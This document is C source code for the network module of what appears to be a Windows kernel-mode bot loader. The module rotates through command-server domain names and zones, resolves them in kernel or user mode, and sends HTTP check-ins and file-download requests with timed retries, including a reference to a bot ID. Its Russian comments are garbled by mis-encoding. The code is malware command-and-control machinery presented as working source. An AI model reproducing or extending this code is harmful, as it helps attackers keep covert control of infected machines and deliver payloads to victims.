void netcomm_free_previous_resources()
{
    USE_GLOBAL_BLOCK
    if (pGlobalBlock->pNetcommBlock->domainName != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetcommBlock->domainName, LOADER_TAG);
    }

    if (pGlobalBlock->pNetcommBlock->server != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetcommBlock->server, LOADER_TAG);
    }

    if (pGlobalBlock->pNetcommBlock->domainPort != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetcommBlock->domainPort, LOADER_TAG);
    }

    if (pGlobalBlock->pNetcommBlock->remotePath != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetcommBlock->remotePath, LOADER_TAG);
    }
}

void netcomm_select_active_element(bool_t isName)
{
    int err;
    uint32_t i = 0, activeIndex;
    char* active;
    uint32_t len;
    USE_GLOBAL_BLOCK

    if (isName) {
        active = pGlobalBlock->pCommonBlock->pConfig->names;
        activeIndex = pGlobalBlock->pCommonBlock->pConfig->activeName;
    }
    else {
        active = pGlobalBlock->pCommonBlock->pConfig->zones;
        activeIndex = pGlobalBlock->pCommonBlock->pConfig->activeZone;

        pGlobalBlock->pNetcommBlock->fnnetcomm_free_previous_resources();
    }

    if (activeIndex > 0) {
        for ( ; ; ++active) {
            if (*active == '\0') {
                ++i;
                if (i == activeIndex) {
                    ++active;
                    break;
                }
            }
        }
    }

    if (isName) {
        pGlobalBlock->pNetcommBlock->activeName = active;
    }
    else {
        pGlobalBlock->pNetcommBlock->activeZone = active;

        len = pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pNetcommBlock->activeName) + pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pNetcommBlock->activeZone) + 1;

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pGlobalBlock->pNetcommBlock->domainName, len, NonPagedPool);
        pGlobalBlock->pCommonBlock->fncommon_strcpy_s(pGlobalBlock->pNetcommBlock->domainName, len, pGlobalBlock->pNetcommBlock->activeName);
        pGlobalBlock->pCommonBlock->fncommon_strcat_s(pGlobalBlock->pNetcommBlock->domainName, len, pGlobalBlock->pNetcommBlock->activeZone);

        err = pGlobalBlock->pNetcommBlock->fnnetcomm_parse_uri(pGlobalBlock->pNetcommBlock->domainName, &pGlobalBlock->pNetcommBlock->server, &pGlobalBlock->pNetcommBlock->port, &pGlobalBlock->pNetcommBlock->domainPort, &pGlobalBlock->pNetcommBlock->remotePath, (uint32_t*)&len);

//         if (err == ERR_OK) {
//             pGlobalBlock->pCommonBlock->fncommon_strcat_s(pGlobalBlock->pNetcommBlock->remotePath, len + 1, pGlobalBlock->pCommonBlock->pConfig->botId);
//         }
    }
}

// ¬озвращает таймаут и 0 в случае, когда список имЄн достиг конца и требуетс€ выбор таймута в верхних сло€х логики.
uint32_t netcomm_rotate()
{
    uint32_t timeout = 0;
    char* active;
    USE_GLOBAL_BLOCK

    // 7. ≈сли текуща€ зона €вл€етс€ последней (или единственной), то переходим к шагу 8, иначе ожидаем rtr_zones_timeout секунд
    //    и делаем активной зоной следующую из списка rtr_zones и переходим к шагу 2.
    // 8. ≈сли текущее им€ €вл€етс€ последним в списке, то переходим к шагу 9, иначе ожидаем rtr_names_timeout секунд, делаем
    //    активным именем следующее из списка rtr_names и переходим к шагу 1.

    active = pGlobalBlock->pNetcommBlock->activeZone;
#if DBG
    pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#endif // DBG

    if (*(active + pGlobalBlock->pCommonBlock->fnstrlen(active) + 1) == '\0') {
        if (pGlobalBlock->pCommonBlock->pConfig->activeName >= (uint32_t)(pGlobalBlock->pCommonBlock->pConfig->rtr_names_count - 1)) {
            pGlobalBlock->pCommonBlock->pConfig->activeName = 0;
        }
        else {
            // ѕереходим на следующее им€ с ожиданием rtr_names_timeout.
            timeout = pGlobalBlock->pCommonBlock->pConfig->rtr_names_timeout;
            ++pGlobalBlock->pCommonBlock->pConfig->activeName;
        }
        pGlobalBlock->pCommonBlock->pConfig->activeZone = 0;
    }
    else {
        // ѕереходим на следующую зону с ожиданием rtr_zones_timeout.
        timeout = pGlobalBlock->pCommonBlock->pConfig->rtr_zones_timeout;
        ++pGlobalBlock->pCommonBlock->pConfig->activeZone;
    }

#if DBG
    pGlobalBlock->pCommonBlock->fncommon_enable_wp();
#endif // DBG

    return timeout;
}

bool_t netcomm_resolve_active_domain()
{
    int err = ERR_BAD;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->serverAddr = 0;

    if (pGlobalBlock->pNetcommBlock->userMode) {
        uint8_t* overlordData;
        uint32_t overlordDataSize;

        if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORIG_NETCOMM_GETHOSTBYNAME, pGlobalBlock->pNetcommBlock->domainName, pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pNetcommBlock->domainName), &overlordData, &overlordDataSize)) {
            pGlobalBlock->pCommonBlock->serverAddr = *(uint32_t*)overlordData;
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(overlordData, LOADER_TAG);
            err = ERR_OK;
        }
    }
    else {
        ip_addr_t srvAddr;

        err = pGlobalBlock->pTcpipBlock->fnnetconn_gethostbyname(pGlobalBlock->pNetcommBlock->domainName, &srvAddr);
        if (err == ERR_OK) {
            pGlobalBlock->pCommonBlock->serverAddr = srvAddr.addr;
        }
    }

    return (err == ERR_OK);
}


// ¬ некоторых случа€х сервер возвращает 302 статус:
// HTTP/1.1 302 Found
// Server: nginx
// Date: Wed, 04 Jul 2012 21:01:49 GMT
// Content-Type: text/html; charset=utf-8
// Connection: close
// Status: 302 Found
// Location: http://tau.rghost.ru/download/39032522/cb2acb0caadc7b35d94943a130e2034a6992055d/calc.zzz
// Cache-Control: max-age=600, private
// X-UA-Compatible: IE=Edge,chrome=1
//
//  2503"
//

int netcomm_send_request_to_server(netcomm_request_type nrt, uint8_t** pHttpBody, uint32_t* pHttpBodySize, uint8_t** pHttpResponse)
{
    int err = ERR_IF;
    char* httpRequest = NULL;
    uint32_t httpRequestLen;
    ip_addr_t srvAddr;
    NTSTATUS ntStatus;
    char* host = NULL;
    char* path = NULL;
    uint16_t port;
    int counter = 0;
    LARGE_INTEGER delay;
    USE_GLOBAL_BLOCK

    delay.QuadPart = -110000000I64; // 11 секунд.

    do {
        if (pGlobalBlock->pNetworkBlock->needReconfigure && pGlobalBlock->pNetcommBlock->userMode == 0) {
            break;
        }

        if (nrt == NRT_DOWNLOAD_FILE) {
            uint8_t zeroVal = 0;
            err = pGlobalBlock->pNetcommBlock->fnnetcomm_parse_uri(pGlobalBlock->pCommonBlock->currFileURI, &host, &port, NULL, &path, NULL);

            if (err != ERR_OK) {
                break;
            }

            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &httpRequest, 4096, NonPagedPool);

            pGlobalBlock->pCommonBlock->fncommon_printfA(httpRequest + 3072, 1024, pGlobalBlock->pNetcommBlock->hdrUserAgent, 
                pGlobalBlock->osMajorVersion, pGlobalBlock->osMinorVersion, 
#ifdef _WIN64
                pGlobalBlock->pNetcommBlock->hdrUserAgentx64
#else
                (char*)&zeroVal
#endif // _WIN64
                );

            ntStatus = pGlobalBlock->pCommonBlock->fncommon_printfA(httpRequest, 3072, pGlobalBlock->pNetcommBlock->getQuery, path, host, httpRequest + 3072);

            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(path, LOADER_TAG);

            if (ntStatus != STATUS_SUCCESS) {
                err = ERR_VAL;
                break;
            }

            httpRequestLen = pGlobalBlock->pCommonBlock->fnstrlen(httpRequest);
        }
        else {
            // √отовим параметры дл€ передачи.
            httpRequest = pGlobalBlock->pNetcommBlock->fnnetcomm_prepare_request(nrt, pGlobalBlock->pNetcommBlock->domainName, pGlobalBlock->pNetcommBlock->remotePath, &httpRequestLen);
            if (httpRequest == NULL) {
                err = ERR_VAL;
                break;
            }

            host = pGlobalBlock->pNetcommBlock->domainName;
            port = pGlobalBlock->pNetcommBlock->port;
        }

        do {
            if (pGlobalBlock->pNetcommBlock->userMode == 1) {
                phttp_request_t pHttpReq;
_try_r3:
                err = ERR_IF;

                pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pHttpReq, sizeof(http_request_t) + httpRequestLen, NonPagedPool);
                __movsb(pHttpReq->http, httpRequest, httpRequestLen);
                pHttpReq->httpSize = httpRequestLen;
                pGlobalBlock->pCommonBlock->fncommon_strcpy_s(pHttpReq->server, sizeof(pHttpReq->server), host);
                pHttpReq->port = port;

                if (pGlobalBlock->pLauncherBlock->fnlauncher_overlord_request(ORID_NETCOMM_TRANSACT, (uint8_t*)pHttpReq, sizeof(http_request_t) + httpRequestLen, pHttpResponse, pHttpBodySize)) {
                    err = pGlobalBlock->pNetcommBlock->fnnetcomm_valide_response(*pHttpResponse, *pHttpBodySize, pHttpBody, pHttpBodySize);
                }

                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHttpReq, LOADER_TAG);
            }
            else {
                err = pGlobalBlock->pTcpipBlock->fnnetconn_gethostbyname(host, &srvAddr);

                if (err == ERR_OK) {
                    err = pGlobalBlock->pNetcommBlock->fnnetcomm_make_server_transaction(srvAddr.addr, port, httpRequest, httpRequestLen, pHttpBody, pHttpBodySize, pHttpResponse);
                }

                if (err != ERR_OK) {
                    goto _try_r3;
                }
            }

            if (++counter < 3 && err != ERR_OK) {
                pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
#ifdef _WIN64
                delay.QuadPart *= 2;
#else
                delay.QuadPart = pGlobalBlock->pCommonBlock->fn_allmul(delay.QuadPart, 2);
#endif // _WIN64
            }
        } while(err != ERR_OK && counter < 3);
    } while (0);

    if (httpRequest != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(httpRequest, LOADER_TAG);
    }

    if (nrt == NRT_DOWNLOAD_FILE && host != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(host, LOADER_TAG);
    }
#if DBG
        if (err == ERR_OK) {
            FnKdPrint(("%s: good knock (type %d)!!!\n", pGlobalBlock->pNetcommBlock->domainName, nrt));
        }

        else {
            if (err == ERR_BAD_SERVER_RESPONSE) {
                FnKdPrint(("%s: bad response from server (type %d)!!!\n", pGlobalBlock->pNetcommBlock->domainName, nrt));
            }
            else {
                FnKdPrint(("%s: no connection or memory error (type %d)!!!\n", pGlobalBlock->pNetcommBlock->domainName, nrt));
            }
        }
#endif // DBG

    return err;
}

void netcomm_shutdown_routine()
{
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetcommBlock->fnnetcomm_free_previous_resources();

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pNetcommBlock, LOADER_TAG);
}
